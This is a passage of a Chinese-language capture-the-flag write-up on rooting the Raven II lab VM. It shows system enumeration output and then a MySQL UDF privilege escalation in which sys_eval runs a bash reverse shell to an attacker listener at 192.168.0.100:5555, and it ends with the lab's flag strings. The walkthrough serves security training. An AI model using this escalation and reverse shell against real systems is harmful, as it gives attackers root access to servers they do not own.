-rw-r--r-- 1 root root 1.1K Apr  9  2017 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root 1.1K Apr  9  2017 systemd-journald.service
-rw-r--r-- 1 root root  842 Apr  9  2017 systemd-journald.socket
-rw-r--r-- 1 root root  557 Apr  9  2017 systemd-kexec.service
-rw-r--r-- 1 root root  691 Apr  9  2017 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Apr  9  2017 systemd-logind.service
-rw-r--r-- 1 root root  795 Apr  9  2017 systemd-machined.service
-rw-r--r-- 1 root root 1.1K Apr  9  2017 systemd-modules-load.service
-rw-r--r-- 1 root root  685 Apr  9  2017 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  936 Apr  9  2017 systemd-networkd.service
-rw-r--r-- 1 root root  605 Apr  9  2017 systemd-nspawn@.service
-rw-r--r-- 1 root root  553 Apr  9  2017 systemd-poweroff.service
-rw-r--r-- 1 root root  681 Apr  9  2017 systemd-quotacheck.service
-rw-r--r-- 1 root root  769 Apr  9  2017 systemd-random-seed.service
-rw-r--r-- 1 root root  841 Apr  9  2017 systemd-readahead-collect.service
-rw-r--r-- 1 root root  638 Apr  9  2017 systemd-readahead-done.service
-rw-r--r-- 1 root root  635 Apr  9  2017 systemd-readahead-done.timer
-rw-r--r-- 1 root root  555 Apr  9  2017 systemd-readahead-drop.service
-rw-r--r-- 1 root root  753 Apr  9  2017 systemd-readahead-replay.service
-rw-r--r-- 1 root root  548 Apr  9  2017 systemd-reboot.service
-rw-r--r-- 1 root root  824 Apr  9  2017 systemd-remount-fs.service
-rw-r--r-- 1 root root  686 Apr  9  2017 systemd-resolved.service
-rw-r--r-- 1 root root  758 Apr  9  2017 systemd-rfkill@.service
-rw-r--r-- 1 root root  475 Apr  9  2017 systemd-shutdownd.service
-rw-r--r-- 1 root root  528 Apr  9  2017 systemd-shutdownd.socket
-rw-r--r-- 1 root root  497 Apr  9  2017 systemd-suspend.service
-rw-r--r-- 1 root root  707 Apr  9  2017 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Apr  9  2017 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Apr  9  2017 systemd-timesyncd.service
-rw-r--r-- 1 root root  665 Apr  9  2017 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  450 Apr  9  2017 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  770 Apr  9  2017 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  750 Apr  9  2017 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  823 Apr  9  2017 systemd-udev-settle.service
-rw-r--r-- 1 root root  715 Apr  9  2017 systemd-udev-trigger.service
-rw-r--r-- 1 root root  578 Apr  9  2017 systemd-udevd-control.socket
-rw-r--r-- 1 root root  575 Apr  9  2017 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  826 Apr  9  2017 systemd-udevd.service
-rw-r--r-- 1 root root  757 Apr  9  2017 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  821 Apr  9  2017 systemd-update-utmp.service
-rw-r--r-- 1 root root  588 Apr  9  2017 systemd-user-sessions.service
-rw-r--r-- 1 root root  395 Apr  9  2017 time-sync.target
-rw-r--r-- 1 root root  355 Apr  9  2017 timers.target
-rw-r--r-- 1 root root  661 Apr  9  2017 tmp.mount
-rw-r--r-- 1 root root  417 Apr  9  2017 umount.target
-rw-r--r-- 1 root root  392 Apr  9  2017 user.slice
-rw-r--r-- 1 root root  497 Apr  9  2017 user@.service
-rw-r--r-- 1 root root  366 Nov 22  2016 dbus.service
-rw-r--r-- 1 root root  106 Nov 22  2016 dbus.socket
-rw-r--r-- 1 root root  290 Dec 20  2015 rsyslog.service
-rw-r--r-- 1 root root  251 Jun 11  2015 cron.service
-rw-r--r-- 1 root root  115 Nov  9  2014 acpid.path
-rw-r--r-- 1 root root  169 Sep 30  2014 atd.service
-rw-r--r-- 1 root root  199 Aug 29  2014 acpid.service
-rw-r--r-- 1 root root  115 Aug 29  2014 acpid.socket
-rw-r--r-- 1 root root  188 Feb 25  2014 rsync.service
/lib/systemd/system/dbus.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Nov 22  2016 dbus.socket -> ../dbus.socket
/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Apr  9  2017 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Apr  9  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Apr  9  2017 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Apr  9  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Nov 22  2016 dbus.service -> ../dbus.service
/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Apr  9  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Apr  9  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Apr  9  2017 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 34 Apr  9  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Apr  9  2017 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 27 Apr  9  2017 systemd-shutdownd.socket -> ../systemd-shutdownd.socket
lrwxrwxrwx 1 root root 14 Nov 22  2016 dbus.socket -> ../dbus.socket
/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Mar 31  2018 forking.conf
/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Apr  9  2017 debian-fixup.service -> ../debian-fixup.service
lrwxrwxrwx 1 root root 31 Apr  9  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Apr  9  2017 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 22 Apr  9  2017 udev-finish.service -> ../udev-finish.service
lrwxrwxrwx 1 root root 20 Apr  9  2017 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Apr  9  2017 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Apr  9  2017 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Apr  9  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Apr  9  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Apr  9  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Apr  9  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Apr  9  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Apr  9  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Apr  9  2017 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 32 Apr  9  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Apr  9  2017 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 31 Apr  9  2017 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Apr  9  2017 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Apr  9  2017 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Apr  9  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Apr  9  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Apr  9  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Apr  9  2017 getty-static.service -> ../getty-static.service
/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Apr  9  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service
/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/runlevel1.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/runlevel2.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/runlevel3.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/runlevel4.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/runlevel5.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Apr  9  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Apr  9  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
/lib/systemd/system/networking.service.d:
total 4.0K
-rw-r--r-- 1 root root 84 Apr  9  2017 network-pre.conf
/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 368 Apr  9  2017 80-container-host0.network
-rw-r--r-- 1 root root 378 Apr  9  2017 80-container-ve.network
-rw-r--r-- 1 root root  73 Apr  9  2017 99-default.link
/lib/systemd/system-generators:
total 408K
-rwxr-xr-x 1 root root 47K Apr  9  2017 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root 31K Apr  9  2017 systemd-debug-generator
-rwxr-xr-x 1 root root 27K Apr  9  2017 systemd-default-display-manager-generator
-rwxr-xr-x 1 root root 55K Apr  9  2017 systemd-fstab-generator
-rwxr-xr-x 1 root root 31K Apr  9  2017 systemd-getty-generator
-rwxr-xr-x 1 root root 67K Apr  9  2017 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root 39K Apr  9  2017 systemd-insserv-generator
-rwxr-xr-x 1 root root 27K Apr  9  2017 systemd-rc-local-generator
-rwxr-xr-x 1 root root 23K Apr  9  2017 systemd-system-update-generator
-rwxr-xr-x 1 root root 51K Apr  9  2017 systemd-sysv-generator
/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 872 Apr  9  2017 90-systemd.preset
/lib/systemd/system-shutdown:
total 0
/lib/systemd/system-sleep:
total 0
### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.10p3
[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3
[-] Apache version:
Server version: Apache/2.4.10 (Debian)
Server built:   Mar 31 2018 09:39:03
[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php5_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)
### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
[-] Installed compilers:
ii  gcc                            4:4.9.2-2                          amd64        GNU C compiler
ii  gcc-4.9                        4.9.2-10+deb8u1                    amd64        GNU C compiler
[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1680 Aug 13  2018 /etc/passwd
-rw-r--r-- 1 root root 804 Aug 13  2018 /etc/group
-rw-r--r-- 1 root root 761 Oct 23  2014 /etc/profile
-rw-r----- 1 root shadow 1173 Nov  9  2018 /etc/shadow
[-] SUID files:
-rwsr-xr-x 1 root root 40000 Mar 30  2015 /bin/mount
-rwsr-xr-x 1 root root 27416 Mar 30  2015 /bin/umount
-rwsr-xr-x 1 root root 40168 May 18  2017 /bin/su
-rwsr-sr-x 1 root mail 89248 Nov 19  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 75376 May 18  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 53616 May 18  2017 /usr/bin/chfn
-rwsr-sr-x 1 daemon daemon 55424 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 39912 May 18  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44464 May 18  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54192 May 18  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 157760 Sep  9  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 464904 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 294512 Nov 22  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10104 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 10240 Feb 13  2017 /usr/sbin/sensible-mda
-rwsr-xr-x 1 root root 90456 Aug 13  2014 /sbin/mount.nfs
[-] SGID files:
-rwsr-sr-x 1 root mail 89248 Nov 19  2017 /usr/bin/procmail
-rwxr-sr-x 3 root mail 10984 Dec  3  2012 /usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 10984 Dec  3  2012 /usr/bin/mail-lock
-rwxr-sr-x 1 root shadow 62272 May 18  2017 /usr/bin/chage
-rwxr-sr-x 1 root mail 14848 Jun  2  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root mail 18704 Nov 19  2017 /usr/bin/lockfile
-rwxr-sr-x 1 root tty 27232 Mar 30  2015 /usr/bin/wall
-rwxr-sr-x 1 root tty 14592 Oct 18  2014 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 35816 Jun 13  2013 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 36008 Jun 11  2015 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 22744 May 18  2017 /usr/bin/expiry
-rwxr-sr-x 3 root mail 10984 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 1 root ssh 350232 Nov 19  2017 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 55424 Sep 30  2014 /usr/bin/at
-rwxr-sr-x 1 root mail 10608 Aug  2  2018 /usr/bin/mutt_dotlock
-rwxr-sr-x 1 root smmsp 74816 Feb 13  2017 /usr/lib/sm.bin/mailstats
-rwxr-sr-x 1 root smmsp 811776 Feb 13  2017 /usr/lib/sm.bin/sendmail
-rwxr-sr-x 1 root shadow 35408 May 28  2017 /sbin/unix_chkpwd
[+] Files with POSIX capabilities set:
/bin/ping6 = cap_net_raw+ep
/bin/ping = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
[-] Can't search *.conf files as no keyword was entered
[-] Can't search *.php files as no keyword was entered
[-] Can't search *.log files as no keyword was entered
[-] Can't search *.ini files as no keyword was entered
[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 3173 Mar 20  2018 /etc/reportbug.conf
-rw-r--r-- 1 root root 2981 Aug 13  2018 /etc/adduser.conf
-rw-r--r-- 1 root root 604 May 16  2012 /etc/deluser.conf
-rw-r--r-- 1 root root 552 Nov 12  2016 /etc/pam.conf
-rw-r--r-- 1 root root 2084 May 18  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 52 May 29 02:26 /etc/resolv.conf
-rw-r--r-- 1 root root 9 Aug  8  2006 /etc/host.conf
-rw-r--r-- 1 root root 144 Aug 13  2018 /etc/kernel-img.conf
-rw-r--r-- 1 root root 956 Dec 28  2016 /etc/mke2fs.conf
-rw-r--r-- 1 root root 34 Apr 10  2017 /etc/ld.so.conf
-rw-r--r-- 1 root root 599 Feb 19  2009 /etc/logrotate.conf
-rw-r--r-- 1 root root 206 Aug 13  2014 /etc/idmapd.conf
-rw-r--r-- 1 root root 191 Sep  8  2014 /etc/libaudit.conf
-rw-r--r-- 1 root root 1260 May 27  2014 /etc/ucf.conf
-rw-r--r-- 1 root root 859 Nov 24  2012 /etc/insserv.conf
-rw-r--r-- 1 root root 2969 Jun 17  2017 /etc/debconf.conf
-rw-r--r-- 1 root root 346 Sep  1  2014 /etc/discover-modprobe.conf
-rw-r--r-- 1 root root 2632 Dec 14  2015 /etc/rsyslog.conf
-rw-r--r-- 1 root root 2584 Feb  7  2014 /etc/gai.conf
-rw-r--r-- 1 root root 6822 Aug 13  2018 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 279 Jun 13  2013 /etc/updatedb.conf
[-] Current user's history files:
-rw------- 1 www-data www-data 3 Aug 13  2018 /var/www/.bash_history
[-] Any interesting mail in /var/mail:
total 356
drwxrwsrwt  2 root     mail   4096 May 29 03:12 .
drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
-rw-rw----  1 michael  mail 231973 May 29 03:12 michael
-rw-rw----  1 www-data mail 113221 May 28 14:47 www-data
### SCAN COMPLETE ####################################
```

<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/5.png" width="56%">
**其中有一个，mysql的服务是以root权限运行，同时还加载了插件目录**
~~~shell
/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
~~~
</details>





<details>
<summary>9. sql提权过程</summary>

```sql
create table foo(line blob);
insert into foo values(load_file('/tmp/lib_mysqludf_sys.so')); 
create function sys_eval returns string soname 'lib_mysqludf_sys.so';
mysql> select * from mysql.func
select * from mysql.func;
 +----------+-----+---------------------+----------+
 | name     | ret | dl                  | type     |
 +----------+-----+---------------------+----------+
 | sys_eval |   0 | lib_mysqludf_sys.so | function |
 +----------+-----+---------------------+----------+
 1 row in set (0.00 sec)

# kali监听：nc -lvp 5555
mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
 ```

> 成功拿到root权限
<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/6.png" width="56%">

</details>




<details>
<summary>10. 至于flag，大家自己找吧，我知道的应该就4个:(第三个是一个图片，因此需要用浏览器加载出来)</summary>

```shell
root@Raven:/var/www/html/vendor# cat PATH
cat PATH
/var/www/html/vendor/
|flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}|
root@Raven:/var/www# cat flag2.txt
cat flag2.txt
|flag2{6a8ed560f0b5358ecf844108048eb337}|
root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/> 11# ls -al
ls -al
total 20
drwxrwxrwx 2 www-data www-data  4096 Nov  9  2018 .
drwxrwxrwx 3 www-data www-data  4096 Nov  9  2018 ..
-rw-rw-rw- 1 www-data www-data 10411 Nov  9  2018 flag3.png
root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# cp flag3.png /var/www/html  # 复制到网站目录
root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# chmod 777 /var/www/html/flag3.png  # 添加访问权限

root@Raven:/root# cat flag4.txt
cat flag4.txt
  ___                   ___ ___
 | _ \__ ___ _____ _ _ |_ _|_ _|
 |   / _` \ V / -_) ' \ | | | |
 |_|_\__,_|\_/\___|_||_|___|___|
|flag4{df2bc5e951d91581467bb9a2a8ff4425}|
CONGRATULATIONS on successfully rooting RavenII
I hope you enjoyed this second interation of the Raven VM
Hit me up on Twitter and let me know what you thought:
@mccannwj / wjmccann.github.io
```

<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/7.png" width="56%">

</details>
 

## 1.2. window

# 2. 遗留
还差一个windows版本的
# 3. 说明
